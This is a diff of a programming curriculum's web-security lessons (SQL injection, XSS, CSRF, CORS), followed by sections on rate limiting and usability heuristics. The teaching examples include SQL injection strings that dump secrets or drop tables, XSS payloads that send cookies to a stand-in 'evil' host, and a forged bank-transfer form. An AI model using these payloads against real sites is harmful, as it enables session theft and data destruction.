-             passed as DATA to the database driver, never mixed into the
-             query's syntax, so it can never be interpreted as SQL commands.
-Trade-off:   None real -- this is close to a strictly-better fix with no
-             meaningful downside, which is why it's a hard rule, not a
-             judgment call.
+UNSAFE:  "SELECT * FROM books WHERE title = '" + q + "'"
+SAFE:    "SELECT * FROM books WHERE title = ?"  + bind(q)
 ```
 
-**XSS (Cross-Site Scripting) - trusting user input inside rendered HTML**
+**XSS → ESCAPE IN CONTEXT (+ CSP):**
 
-```text
-System:      A comment section renders user-submitted text directly
-             into the page's HTML.
-Weakness:    If the input isn't escaped, submitted text like
-             <script>...</script> is executed as real code by every
-             browser that views the page, not displayed as text.
-Attack:      An attacker posts a comment containing malicious JavaScript;
-             it runs in every other visitor's browser, in the context of
-             the trusted site (able to steal their session cookie, Phase 68).
-Defense:     ESCAPE/SANITIZE all user-generated content before rendering
-             it as HTML, and set a Content Security Policy restricting
-             what scripts a page is allowed to run at all.
-```
+User text rendered as HTML becomes script in visitors' browsers (stored / reflected / DOM-based). Escape with a context-aware template engine; prefer `textContent` over `innerHTML`. Sanitize with a maintained library if HTML is required. **Content-Security-Policy** is depth when escaping fails. `HttpOnly` cookies (Phase 68) blunt cookie theft if XSS still occurs.
 
-**CSRF (Cross-Site Request Forgery) - trusting that a request came from where it claims**
+**CSRF → TOKEN + SAMESITE:**
 
-```text
-System:      A logged-in user's browser automatically attaches their
-             session cookie (Phase 68) to every request to your site.
-Weakness:    A malicious page on a COMPLETELY DIFFERENT site can trigger
-             a request to your site (e.g. an auto-submitting form), and
-             the victim's browser will still attach their valid session
-             cookie -- your server can't tell it wasn't intentional.
-Attack:      Victim, while logged into their bank, visits a malicious
-             page that silently submits a "transfer money" form to the
-             bank's real endpoint; the browser attaches the victim's
-             real session cookie automatically.
-Defense:     A CSRF token -- a random, unpredictable value embedded in
-             your own site's legitimate forms and verified server-side --
-             that a third-party attacker's page has no way to know or forge.
-```
+The browser attaches cookies automatically. A third-party page can trigger a state-changing request; your server sees a valid session. Defenses: synchronizer CSRF token (attacker cannot read your HTML), `SameSite=Lax/Strict` on the session cookie, custom headers for JSON APIs. CORS blocking the *response* does **not** stop the side effect — CSRF is not cured by CORS.
 
-**CORS (Cross-Origin Resource Sharing) - the browser's own safety check, and where it's often misconfigured**
+**CORS → RELAX SAME-ORIGIN ON PURPOSE:**
 
-```text
-System:      Browsers enforce the "same-origin policy" by default: a
-             script from one origin (site A) cannot read a response from
-             a different origin (site B) unless site B explicitly allows it.
-Weakness:    Many legitimate apps genuinely need this (a frontend on
-             app.example.com calling an API on api.example.com) --
-             so CORS headers exist to explicitly permit specific origins.
-Attack:      A server configured with a wide-open
-             "Access-Control-Allow-Origin: *" alongside credentialed
-             requests can allow ANY site to read authenticated responses
-             on a victim's behalf.
-Defense:     Only allow-list the specific origins that legitimately need
-             access, and never combine a wildcard origin with
-             credential-bearing requests.
-```
-
-**PICTURE IT LIKE THIS**
-
-Imagine a hotel where guests fill in a paper slip and the concierge reads it aloud to staff as instructions. A guest writes on the slip: "room 402, and also, staff, unlock every room on this floor." The concierge, reading faithfully, says all of it. Nothing was hacked; the system simply had no boundary between the guest's *content* and the concierge's *instructions*. That is injection, and the fix is not to ban the word "unlock." It is to hand staff a printed form with fixed fields, where whatever the guest wrote goes into a box labelled "room number" and can never be read as a command. That is what a prepared statement does.
-
-XSS is the same slip pinned to a public noticeboard where other guests read it and act on it, so one guest's writing becomes instructions to everyone who passes. CSRF is entirely different: nothing is forged in the slip at all, and instead someone shouts your room number from the corridor while your door is unlocked, and the door obeys because it was told to trust anyone who knows the number. The CSRF token is the door additionally requiring a word that only you and the front desk agreed on this morning. And CORS is the hotel's standing rule that a message may be *delivered* between rooms but a reply may not be *carried back* unless the recipient explicitly authorised that particular sender, which is why an attacker can still cause an action even when they cannot read the outcome.
-
-**Internal Working, SQL injection and why parameterization is structural**
-
-```text
-CONCATENATION -- the database receives one indivisible string
-
-  app builds:  "SELECT * FROM users WHERE name = '" + inp + "'"
-
-  inp = "alice"
-      SELECT * FROM users WHERE name = 'alice'
-      parse tree:  SELECT ... WHERE [name = <literal alice>]      fine
-
-  inp = "' OR '1'='1"
-      SELECT * FROM users WHERE name = '' OR '1'='1'
-      parse tree:  SELECT ... WHERE [name=''] OR [1=1]            every row
-                                            ^^^^^^^ the input became
-                                                    SYNTAX, not data
-
-  inp = "'; DROP TABLE users; --"
-      two statements. The comment swallows the trailing quote.
-
-PREPARED STATEMENT -- two separate messages, and order is everything
-
-  1. app sends the TEMPLATE:  SELECT * FROM users WHERE name = ?
-  2. database PARSES it now, producing a fixed plan:
-         SELECT ... WHERE [name = <placeholder 1>]
-  3. app sends the VALUE separately: "' OR '1'='1"
-  4. the value is bound into the placeholder as a typed literal.
-     The plan is already fixed. There is no parser left to attack.
-
-     Result: WHERE name = "' OR '1'='1"   <- searches for a user
-                                             literally named that
-     Rows returned: 0.
-
-  This is why the fix is a guarantee and not a filter. No amount
-  of cleverness in step 3 can change a tree built in step 2.
-
-  What parameterization CANNOT do -- identifiers are not values:
-      f"SELECT * FROM {table} ORDER BY {col} {direction}"   still unsafe
-      Fix: allowlist.  if col not in {"name","created_at"}: reject
-```
-
-**Internal Working, the three flavours of XSS and where each defence applies**
-
-```text
-STORED            attacker -> your DB -> every future viewer
-   POST /comments  body: <img src=x onerror=fetch('//evil/'+document.cookie)>
-   server stores it verbatim, renders it verbatim
-   -> fires in EVERY visitor's browser, as your origin
-   Stopped by: escaping on output  +  HttpOnly (Phase 68) blunts the theft
-
-REFLECTED         attacker -> victim's URL -> echoed back once
-   /search?q=<script>...</script>   rendered into the results page
-   Needs the victim to open a crafted link
-   Stopped by: escaping on output
-
-DOM-BASED         never reaches the server at all
-   document.getElementById("out").innerHTML = location.hash.slice(1)
-   /page#<img src=x onerror=...>
-   The fragment is NOT sent to the server, so server-side
-   escaping is irrelevant by construction.
-   Stopped by: textContent instead of innerHTML, client-side care
-
-CONTEXT IS THE PART PEOPLE MISS -- one escaping rule is not enough
-
-   <div>       USER      </div>        escape < > &
-   <input value="USER">                escape quotes too, or the
-                                       attacker closes the attribute
-   <a href="USER">                     validate the SCHEME, or
-                                       javascript:alert(1) works
-                                       through any HTML escaping
-   <script> var x = "USER" </script>   HTML escaping does NOTHING
-                                       here; needs JS escaping
-   <div style="width:USER">            CSS context, different again
-
-   Which is why the real rule is: use a context-aware template
-   engine and never build HTML with string concatenation.
-
-DEFENCE IN DEPTH -- CSP, for when escaping failed anyway
-
-   Content-Security-Policy:
-       default-src 'self';
-       script-src 'self' 'nonce-r4nd0m';
-       object-src 'none';
-       base-uri 'none'
-
-   An injected <script> has no nonce -> the browser refuses to
-   run it even though it is sitting in the DOM.
-```
-
-**Internal Working, CSRF and why CORS does not stop it**
-
-```text
-  victim's browser is logged into bank.com (cookie: sid=abc)
-
-  victim visits evil.com, which serves:
-
-      <form action="https://bank.com/transfer" method="POST">
-        <input name="to"     value="attacker">
-        <input name="amount" value="10000">
-      </form>
-      <script>document.forms[0].submit()</script>
-
-  What happens:
-      1. browser sends POST to bank.com
-      2. browser ATTACHES sid=abc  <- automatic, by design
-      3. bank.com sees a valid session and a well-formed request
-      4. transfer executes
-      5. the RESPONSE is blocked from evil.com by CORS
-
-  Step 5 is the crucial misunderstanding. CORS blocked the
-  attacker from READING the reply. The transfer already happened.
-  The attacker never needed to read anything.
-
-  DEFENCE 1 -- synchronizer token
-      bank.com's own form contains  <input name="csrf" value="Z9x..">
-      server verifies it matches the session's stored value.
-      evil.com cannot read bank.com's HTML (same-origin policy),
-      so it cannot know the token. Request arrives without it -> 403.
-
-  DEFENCE 2 -- SameSite on the session cookie
-      Set-Cookie: sid=abc; SameSite=Lax
-      the browser simply does not attach the cookie to a
-      cross-site POST. The request arrives UNAUTHENTICATED.
-      This is now the browser default, which retired most of
-      this attack class without any application change.
-
-  DEFENCE 3 -- custom header (works for JSON APIs)
-      require X-Requested-With or a JSON content type; a plain
-      HTML form cannot set either, and setting them from JS
-      triggers a CORS preflight the attacker cannot satisfy.
-
-  NOT a defence: checking the Referer header alone (strippable),
-  or using POST instead of GET (forms can POST).
-```
-
-**Internal Working, the CORS preflight**
-
-```text
-SIMPLE REQUEST (GET/HEAD/POST, only safelisted headers)
-  sent immediately; the browser withholds the RESPONSE from the
-  script unless the headers permit it.
-
-  GET /data            Origin: https://app.example.com
-  200 OK               Access-Control-Allow-Origin: https://app.example.com
-                       -> script may read it
-  200 OK               (no ACAO header)
-                       -> the response arrived, the script cannot see it
-
-PREFLIGHTED REQUEST (PUT/DELETE/PATCH, or custom headers, or JSON)
-
-  OPTIONS /data                                    <- extra round trip
-     Origin: https://app.example.com
-     Access-Control-Request-Method: DELETE
-     Access-Control-Request-Headers: authorization
-
-  204 No Content
-     Access-Control-Allow-Origin:  https://app.example.com
-     Access-Control-Allow-Methods: GET, POST, DELETE
-     Access-Control-Allow-Headers: authorization
-     Access-Control-Max-Age:       86400   <- cache it, or you pay
-                                              this RTT on every call
-
-  ...only then is the real DELETE sent.
-
-THE MISCONFIGURATIONS THAT ARE ACTUAL VULNERABILITIES
-
-  Access-Control-Allow-Origin: *
-  Access-Control-Allow-Credentials: true
-      -> browsers reject this combination outright. Safe by luck.
-
-  Access-Control-Allow-Origin: <whatever Origin the caller sent>
-  Access-Control-Allow-Credentials: true
-      -> DANGEROUS. Equivalent to the above, but browsers accept
-         it. ANY site can now read your authenticated responses.
-
-  if origin.endswith("example.com")        -> notexample.com passes
-  if origin.startswith("https://example")  -> example.evil.com passes
-      -> exact match against an allowlist, or nothing.
-```
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Attack                 | Layer it targets       | Root cause                             | Correct fix                                   | Cost of the fix                                   |
-| ---------------------- | ---------------------- | -------------------------------------- | --------------------------------------------- | ------------------------------------------------- |
-| SQL injection          | database query (14.2)  | data parsed as syntax                  | prepared statements, allowlist identifiers    | essentially none, often faster due to plan reuse  |
-| Stored / reflected XSS | HTML rendering (13.1)  | data parsed as markup                  | context-aware output escaping                 | none, it is the template engine default           |
-| DOM-based XSS          | client-side JS         | data written into `innerHTML`          | `textContent`, sanitize when HTML is required | small, sanitizer adds ~20 KB                      |
-| XSS, second layer      | browser execution      | escaping might fail                    | Content Security Policy                       | real, requires removing inline scripts and styles |
-| CSRF                   | session cookies (Phase 68) | automatic cookie attachment            | `SameSite` plus a synchronizer token          | small, per-form token plumbing                    |
-| CORS misconfiguration  | same-origin policy     | reflecting the origin with credentials | exact allowlist match                         | none, it is strictly less code                    |
-
-
-The trade-offs here are unusually one-sided, and that is the point worth taking away. Parameterized queries and output escaping are close to free and are strictly better, which is why they are rules rather than judgment calls. Only two items involve genuine cost. A strict Content Security Policy requires refactoring away inline scripts and event handlers, which in a legacy application can be weeks of work, and the intermediate step of running it in report-only mode exists precisely so you can measure the damage before enforcing. And CSRF tokens add plumbing to every form and every AJAX call, which is why frameworks bundle it and why `SameSite` becoming the default was so valuable. The pattern across the whole table is that these bugs are cheap to prevent at design time and extremely expensive to find and fix later, which is the actual argument for learning them before you need them.
-
-**SMALL WORKING EXAMPLE**
+Same-origin policy: script may often *send* cross-origin requests but may not *read* responses unless the server allows. Allowlist exact origins; never reflect arbitrary `Origin` with `Allow-Credentials: true`.
 
 ```python
-import sqlite3, html, secrets, hmac, re
-from urllib.parse import urlparse
+import sqlite3, html, secrets
 
-# ===============================================================
-# 1. SQL INJECTION -- the attack, then the structural fix
-# ===============================================================
 db = sqlite3.connect(":memory:")
 db.executescript("""
-    CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, secret TEXT);
-    INSERT INTO users VALUES (1,'alice','a-token'), (2,'bob','b-token');
+CREATE TABLE books (id INTEGER PRIMARY KEY, title TEXT);
+INSERT INTO books VALUES (1, 'Dune'), (2, 'Neuromancer');
 """)
 
-def vulnerable(name):
-    q = f"SELECT id, name FROM users WHERE name = '{name}'"   # NEVER
-    return q, db.execute(q).fetchall()
+def vulnerable_search(q):
+    return db.execute(f"SELECT id, title FROM books WHERE title = '{q}'").fetchall()
 
-def safe(name):
-    q = "SELECT id, name FROM users WHERE name = ?"           # ALWAYS
-    return q, db.execute(q, (name,)).fetchall()
+def safe_search(q):
+    return db.execute("SELECT id, title FROM books WHERE title = ?", (q,)).fetchall()
 
-for payload in ["alice", "' OR '1'='1", "' UNION SELECT id, secret FROM users --"]:
-    print(f"\ninput: {payload!r}")
-    q, rows = vulnerable(payload); print("  vulnerable ->", rows)
-    q, rows = safe(payload);       print("  safe       ->", rows)
-# The safe version returns [] for the payloads: it looked for a user
-# literally named "' OR '1'='1" and, correctly, found nobody.
+for q in ["Dune", "' OR '1'='1"]:
+    print("input", repr(q))
+    print("  unsafe:", vulnerable_search(q))
+    print("  safe  :", safe_search(q))
 
-# Identifiers cannot be parameterized, so they need an allowlist.
-SORTABLE = {"name", "id"}          # not user input, a fixed set
-def search(name, sort_by="name", direction="ASC"):
-    if sort_by not in SORTABLE:                  raise ValueError("bad column")
-    if direction.upper() not in {"ASC", "DESC"}: raise ValueError("bad direction")
-    return db.execute(
-        f"SELECT id, name FROM users WHERE name LIKE ? ORDER BY {sort_by} {direction}",
-        (f"%{name}%",),
-    ).fetchall()
-print("\nallowlisted sort:", search("a", "name", "DESC"))
+comment = "<script>alert(1)</script>"
+print("escaped comment:", html.escape(comment))
 
-# ===============================================================
-# 2. XSS -- escaping is context-dependent, which is the whole trick
-# ===============================================================
-payload = '"><script>fetch("//evil/"+document.cookie)</script>'
-
-print("\nHTML body context")
-print("  unsafe:", f"<div>{payload}</div>")
-print("  safe:  ", f"<div>{html.escape(payload)}</div>")
-
-print("attribute context -- needs quote escaping too")
-print("  safe:  ", f'<input value="{html.escape(payload, quote=True)}">')
-
-def safe_url(u):
-    # HTML escaping does not help here at all: javascript:alert(1)
-    # contains no special HTML characters. The SCHEME is the risk.
-    scheme = (urlparse(u).scheme or "").lower()
-    return u if scheme in {"http", "https", "mailto", ""} else "#"
-
-print("href context -- validate the scheme, not the characters")
-for u in ["https://ok.example", "javascript:alert(1)", "data:text/html,<script>"]:
-    print(f"  {u!r:38} -> {safe_url(u)!r}")
-
-# When user HTML genuinely must render, allowlist. Never a regex.
-#   import bleach
-#   bleach.clean(user_html, tags=["b","i","em","strong","a","p","code"],
-#                attributes={"a": ["href", "title"]}, protocols=["http","https"])
-
-def csp_header(nonce):
-    return ("Content-Security-Policy: "
-            "default-src 'self'; "
-            f"script-src 'self' 'nonce-{nonce}'; "   # injected <script>
-            "object-src 'none'; "                    # has no nonce ->
-            "base-uri 'none'; "                      # does not execute
-            "frame-ancestors 'none'")                # also stops clickjacking
-print("\n" + csp_header(secrets.token_urlsafe(16)))
-
-# ===============================================================
-# 3. CSRF -- synchronizer token, verified in constant time
-# ===============================================================
-CSRF_TOKENS = {}
-
-def issue_csrf(session_id):
-    t = secrets.token_urlsafe(32)
-    CSRF_TOKENS[session_id] = t
-    return t
-
-def check_csrf(session_id, submitted):
-    expected = CSRF_TOKENS.get(session_id)
-    # compare_digest so the check does not leak the token's prefix
-    return bool(expected and submitted and hmac.compare_digest(expected, submitted))
-
-sid = "session-abc"
-token = issue_csrf(sid)
-print("\nlegitimate form submission:", check_csrf(sid, token))
-print("attacker's forged POST     :", check_csrf(sid, "guessed-value"))
-print("attacker omits it entirely :", check_csrf(sid, None))
-
-def state_changing_endpoint(session_id, form, headers):
-    # Layer 1: SameSite means the cookie usually is not even here.
-    # Layer 2: the token an off-site page cannot read.
-    if not check_csrf(session_id, form.get("csrf")):
-        return 403, "csrf validation failed"
-    return 200, "transfer executed"
-print("endpoint without token:", state_changing_endpoint(sid, {}, {}))
-print("endpoint with token   :", state_changing_endpoint(sid, {"csrf": token}, {}))
-
-# ===============================================================
-# 4. CORS -- exact allowlist, never reflection
-# ===============================================================
-ALLOWED = {"https://app.example.com", "https://admin.example.com"}
-
-def cors_headers(origin, credentialed=True):
-    # The vulnerability is reflecting whatever arrived:
-    #   return {"Access-Control-Allow-Origin": origin,
-    #           "Access-Control-Allow-Credentials": "true"}
-    # which lets ANY site read authenticated responses.
-    if origin not in ALLOWED:          # exact membership, not endswith
-        return {}                      # omit the header -> browser blocks
-    h = {"Access-Control-Allow-Origin": origin, "Vary": "Origin"}
-    if credentialed:
-        h["Access-Control-Allow-Credentials"] = "true"
-    return h
-
-for o in ["https://app.example.com", "https://evil.com",
-          "https://app.example.com.evil.com", "https://notexample.com"]:
-    print(f"\norigin {o:38} -> {cors_headers(o) or 'BLOCKED'}")
-
-def preflight(origin, method, req_headers):
-    if origin not in ALLOWED:
-        return 403, {}
-    h = cors_headers(origin)
-    h.update({
-        "Access-Control-Allow-Methods": "GET, POST, PATCH, DELETE",
-        "Access-Control-Allow-Headers": "authorization, content-type",
-        "Access-Control-Max-Age": "86400",   # cache, or pay an RTT per call
-    })
-    return 204, h
-print("\npreflight:", preflight("https://app.example.com", "DELETE", ["authorization"]))
+csrf = secrets.token_urlsafe(32)  # embed in form; verify on POST
+print("csrf token set for session")
 ```
 
-**Documentation**
+| Failure | Fix |
+| ------- | --- |
+| SQLi | Prepared statements; allowlist identifiers |
+| XSS | Context-aware escaping; CSP; careful DOM APIs |
+| CSRF | SameSite + synchronizer token |
+| CORS misconfig | Exact origin allowlist; no credentialed wildcards |
 
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - the industry-standard, regularly-updated list of the most critical web application security risks, covering all of the above and more
-- [Cloudflare Learning Center - What is OWASP? What are the OWASP Top 10?](https://www.cloudflare.com/learning/security/threats/owasp-top-10/)
+**PRACTICE:**
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Rewrite one concatenated bookstore query as parameterized; explain why the parse tree cannot change |
+| Medium | For a comment box, list stored vs reflected vs DOM XSS and one defense each |
+| Hard | Explain why CORS does not stop CSRF; design SameSite + token for `POST /orders` |
 
-Security-focused interview rounds expect you to explain each of these using the *same* System -> Weakness -> Attack -> Defense shape used here - showing you understand *why* the defense works, not just that "parameterized queries stop SQL injection" as a memorized fact.
+**PRACTICE WITH A SMALL PROJECT:**
 
-**PRACTICE WITH A SMALL PROJECT**
+Harden a tiny bookstore endpoint set against SQLi/XSS/CSRF and document rate limits on login — then build the [Phase 69 mini-project](../guides/Projects.md#cs-phase-69-project).
 
-Take the REST API you designed in Phase 59's mini-project and, for each endpoint, write down: what authentication it requires, what would happen if an attacker tried each of the four attacks above against it, and which specific defense stops each one.
+**WHAT THIS UNLOCKS NEXT:**
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                                      |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Run the SQL injection code above and explain why the safe version returns zero rows rather than an error                                                                                                  |
-| Easy       | Explain in one sentence why `'" OR 1=1 --'` changes a concatenated query's meaning but cannot change a prepared statement's                                                                               |
-| Easy       | Complete the first three levels of [Google's XSS Game](https://xss-game.appspot.com/) and write down the injection context for each                                                                       |
-| Easy       | Explain why CORS does not prevent CSRF, in three sentences                                                                                                                                                |
-| Easy       | Find the `Access-Control-Allow-Origin` header on any public API using your browser's Network panel, and say what it permits                                                                               |
-| Easy       | List the four cookie attributes from Phase 68 and match each to the attack in this section it helps against                                                                                                   |
-| Medium     | Install [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) and solve every challenge in the injection and XSS categories                                                                       |
-| Medium     | Write a deliberately vulnerable login endpoint, bypass it with injection, then fix it with parameterization and prove the same payload now fails                                                          |
-| Medium     | Build a comment feature that is vulnerable to stored XSS, steal your own session cookie with it, then add `HttpOnly` and show what the attacker gets instead                                              |
-| Medium     | Add a context-aware template engine to that feature and demonstrate that the same payload renders as visible text in the body, an attribute, and an `href`                                                |
-| Medium     | Write a CSP in report-only mode for an existing page, collect the violation reports, and list everything you would have to change to enforce it                                                           |
-| Medium     | Host an attacker page on a different port that CSRFs a state-changing endpoint on your own app, then defeat it twice, once with `SameSite` and once with a token                                          |
-| Medium     | Implement the reflecting-origin CORS misconfiguration, exploit it from another origin to read an authenticated response, then fix it with an exact allowlist                                              |
-| Medium     | Complete five labs each from PortSwigger's [SQL injection](https://portswigger.net/web-security/sql-injection) and [XSS](https://portswigger.net/web-security/cross-site-scripting) tracks                |
-| Medium     | Build a dynamic sort feature safely, then explain precisely why the column name could not be a bound parameter                                                                                            |
-| Hard       | Exploit a blind SQL injection using only response timing, extracting a value one character at a time, then explain why the usual "no data was returned" reasoning is wrong                                |
-| Hard       | Build a DOM-based XSS from `location.hash`, confirm with server logs that the payload never reached the server, then fix it client-side                                                                   |
-| Hard       | Write a sanitizer allowlist for user-submitted HTML, then try to bypass your own with mutation XSS techniques from [DOMPurify's test suite](https://github.com/cure53/DOMPurify)                          |
-| Hard       | Take an existing application and drive it to a strict nonce-based CSP with zero inline scripts. Document every refactor required                                                                          |
-| Hard       | Complete PortSwigger's [CSRF](https://portswigger.net/web-security/csrf) and [CORS](https://portswigger.net/web-security/cors) tracks in full, then write one paragraph per lab explaining the root cause |
-| Hard       | Take your Phase 59 API and produce a full threat model: every endpoint, every trust boundary, every one of these four attacks, the specific defence, and the test that proves the defence works         |
-| Hard       | Configure a database user with least privilege for your application, then demonstrate that a successful injection still cannot read another schema or drop a table                                        |
-| Hard       | Read the current [OWASP Top 10](https://owasp.org/www-project-top-ten/) in full and identify the three categories in it that this section does not cover, then explain each in your own words             |
-
-
-**MASTERY CHECKPOINT FOR PHASE 69:** Explain how a password should be stored and why each part of that answer matters, explain the difference between a session cookie and a JWT, and pick any one attack above and explain both the exploit and the fix without looking it up.
-
-**WHY THE NEXT TOPIC IS NEEDED - Rate Limiting:** Injection and CSRF defenses assume the attacker still has to *reach* your expensive endpoints. Without a throttle, login hashing (Phase 67), password spraying, and scrape bots become availability and cost problems. Basic rate limiting is the next control - not a full distributed design interview (that returns in Story XI).
+Injection and CSRF defenses assume the attacker still has to *reach* expensive endpoints. Without a throttle, Argon2 login, password spraying, and scrapers become availability and cost problems. Basic rate limiting is Phase 69.2 — not distributed system-design depth (that returns in Story XI).
 
 ---
 
 ## 69.2 Basic Rate Limiting
 
-**WHY YOU ARE LEARNING THIS:** Application security is not only "wrong string in SQL." It is also "too many attempts." Rate limiting bounds how often an identity, IP, or API key may call a sensitive endpoint. Keep this *basic*: fixed window or token bucket on one machine. Distributed rate limiters belong with system design later.
+Application security is also "too many attempts." Rate limiting bounds how often an IP, user, or API key may call a sensitive route. Keep this **basic**: fixed window or token bucket on one machine. Multi-region limiters belong with later system design.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
-- [Rate Limiter System Design: Token Bucket (ByteByteGo)](https://www.youtube.com/watch?v=YXkOdWBwqaA) *(Composio YouTube)* - algorithms; ignore multi-region depth for now
-- Alternative: [Token Bucket in 100 Seconds](https://www.youtube.com/watch?v=my5dGtncxfw) *(Composio YouTube)*
-- Written: HTTP `429 Too Many Requests`; `Retry-After` header
-
-**STEP-BY-STEP EXPLANATION**
+**ALGORITHMS:**
 
 | Algorithm | Idea | Good for |
 | --------- | ---- | -------- |
-| **Fixed window** | Count requests per calendar minute/hour | Simple quotas |
-| **Sliding window** | Smooth the fixed-window cliff at boundaries | Fairer quotas |
-| **Token bucket** | Tokens refill at a rate; each request spends one | Bursts + sustained limit |
+| Fixed window | Count per minute/hour | Simple quotas |
+| Sliding window | Smooth the window edge | Fairer quotas |
+| Token bucket | Refill tokens; spend per request | Bursts + sustained cap |
 
-Apply limits **before** expensive work (Argon2 verify, outbound SMS). Prefer keys like `(ip, route)` for anonymous and `(user_id, route)` when authenticated. Return **429** with a clear body; avoid lockouts that become easy DoS against a victim username without careful design.
+Apply limits **before** expensive work (Argon2, SMS). Keys like `(ip, route)` anonymous and `(user_id, route)` when authenticated. Return **429** with `Retry-After`. Naive per-username lockout without care becomes DoS against Ada's account.
 
 ```text
-Login endpoint:
+Login:
   1. rate_limit(ip) and rate_limit(username_attempt)
   2. only then Argon2 verify
-  3. on success: regenerate session; optional MFA step-up
+  3. on success: regenerate session; optional MFA
 ```
 
-**SMALL WORKING EXAMPLE**
-
 ```python playground=cs-phase-69-rate-limit
-# Token bucket (single process). Capacity=5, refill 1 token / second.
-
 import time
 
 class TokenBucket:
     def __init__(self, capacity, refill_per_sec):
         self.capacity = capacity
         self.refill = refill_per_sec
-        self.tokens = capacity
+        self.tokens = float(capacity)
         self.t = time.monotonic()
 
     def allow(self):
@@ -15096,101 +12357,98 @@ class TokenBucket:
         return False
 
 bucket = TokenBucket(5, 1.0)
-print([bucket.allow() for _ in range(7)])  # five True, then False...
+print([bucket.allow() for _ in range(7)])  # five True, then False…
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Explain 429 and when to send `Retry-After` |
-| Medium | Place rate limits on login vs public read API differently and justify |
-| Hard | Show how account lockout without rate limits becomes a DoS against a victim |
+| Medium | Place different limits on bookstore login vs public catalog read; justify |
+| Hard | Show how account lockout without rate limits becomes DoS against a victim username |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-**WHY THE NEXT TOPIC IS NEEDED - Human-Computer Interaction:** A secure system that users cannot understand will be circumvented - passwords on sticky notes, ignored warnings, shared accounts. Security without usable design fails in the real world. That is Phase 70.
-
-
----
-
-> **Phase 69 complete?** [Continue to Phase 70](#phase-70)
+Defenses exist — and users still write passwords on sticky notes, click through warnings, and approve every MFA prompt. A secure system that is confusing will be circumvented. Usable security and HCI heuristics are Phase 70.
 
 ---
 
+> **Phase 69 complete?** [Build the Phase 69 mini-project](../guides/Projects.md#cs-phase-69-project) · [Continue to Phase 70](#phase-70)
+
+---
 
 # PHASE 70 - Human-Computer Interaction
 
 **Track:** Human-Centered Software
 
-**WHAT YOU WILL BE ABLE TO DO:** Critique and redesign a confusing interface using Nielsen's usability heuristics, and explain why usable security (clear errors, password managers, honest defaults) is part of defense - not optional polish.
+**WHAT YOU WILL BE ABLE TO DO:** Critique and redesign a confusing interface using Nielsen's usability heuristics, and explain why usable security (clear recovery, password managers, honest defaults) is part of defense — not optional polish.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 68-69 (auth and attack surfaces create UI states users must navigate safely), Phase 21-30 (interfaces are still software with invariants).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 68–69 — auth and attack surfaces create UI states users must navigate safely.
+
+**LEARNING RESOURCES:**
+
+- [Jakob Nielsen's 10 Usability Heuristics (IxDF)](https://www.youtube.com/watch?v=ETGtsleVOpE)
+- [10 Usability Heuristics for User Interface Design (NN/g)](https://www.nngroup.com/articles/ten-usability-heuristics/)
+- [How to Conduct a Heuristic Evaluation (NN/g)](https://www.nngroup.com/articles/how-to-conduct-a-heuristic-evaluation/)
+- [NIST SP 800-63B — Digital Identity (passwords & authenticators)](https://pages.nist.gov/800-63-3/sp800-63b.html)
 
 ## 70.1 Users, Heuristics, and Usable Security
 
-**WHY YOU ARE LEARNING THIS:** Every system you have built so far is only as good as a human's ability to use it correctly under stress. A login form that hides error reasons, a permission dialog nobody reads, or a password policy that forces `Password1!` all create *security failures that look like user mistakes*. HCI gives you a vocabulary for evaluating interfaces before users get hurt.
+You can parameterize SQL and hash passwords — and still lose if the secure path is harder than the insecure one. A login that forbids paste blocks password managers. An MFA prompt on every low-risk click trains blind approval. HCI is a short survey with a sharp security edge: make the right behavior the easy behavior.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**NIELSEN'S HEURISTICS AS A CHECKLIST:**
 
-- Best overview: [Jakob Nielsen's 10 Usability Heuristics (IxDF)](https://www.youtube.com/watch?v=ETGtsleVOpE) *(Composio YouTube)*
-- Alternative: [What Is a Heuristic Evaluation? (ITGeekGurl)](https://www.youtube.com/watch?v=qS1SnYLshJY) *(Composio YouTube)*
-- Written: [10 Usability Heuristics for User Interface Design (NN/g)](https://www.nngroup.com/articles/ten-usability-heuristics/) *(Composio web + fetch)*; [How to Conduct a Heuristic Evaluation (NN/g)](https://www.nngroup.com/articles/how-to-conduct-a-heuristic-evaluation/theory-heuristic-evaluations/)
-- Research angle: usable security papers on password managers and 2FA friction *(Composio Scholar)* - the theme is consistent: if the secure path is harder than the insecure path, users choose insecure
-- Practice: pick any app you use daily and score it against five heuristics with concrete screenshots
+1. **Visibility of system status** — loading, saved, failed  
+2. **Match the real world** — words users know  
+3. **User control and freedom** — undo, cancel, escape  
+4. **Consistency and standards** — same words mean the same things  
+5. **Error prevention** — disable impossible actions  
+6. **Recognition rather than recall** — show options  
+7. **Flexibility and efficiency** — shortcuts for experts  
+8. **Aesthetic and minimalist design** — every extra element competes  
+9. **Help recognize, diagnose, recover from errors** — plain language + a fix  
+10. **Help and documentation** — short, task-oriented  
 
-**STEP-BY-STEP EXPLANATION**
-
-Nielsen's heuristics are not laws - they are a checklist that catches most disasters early:
-
-1. **Visibility of system status** - the user always knows what the system is doing (loading, saved, failed).
-2. **Match between system and the real world** - words and metaphors users already know.
-3. **User control and freedom** - undo, cancel, escape from mistakes.
-4. **Consistency and standards** - same words and patterns mean the same things.
-5. **Error prevention** - stop bad states before they happen (disable impossible actions).
-6. **Recognition rather than recall** - show options; do not force memory.
-7. **Flexibility and efficiency** - shortcuts for experts without punishing beginners.
-8. **Aesthetic and minimalist design** - every extra element competes with the signal.
-9. **Help users recognize, diagnose, and recover from errors** - plain language, a fix, not a stack trace.
-10. **Help and documentation** - searchable, task-oriented, short.
-
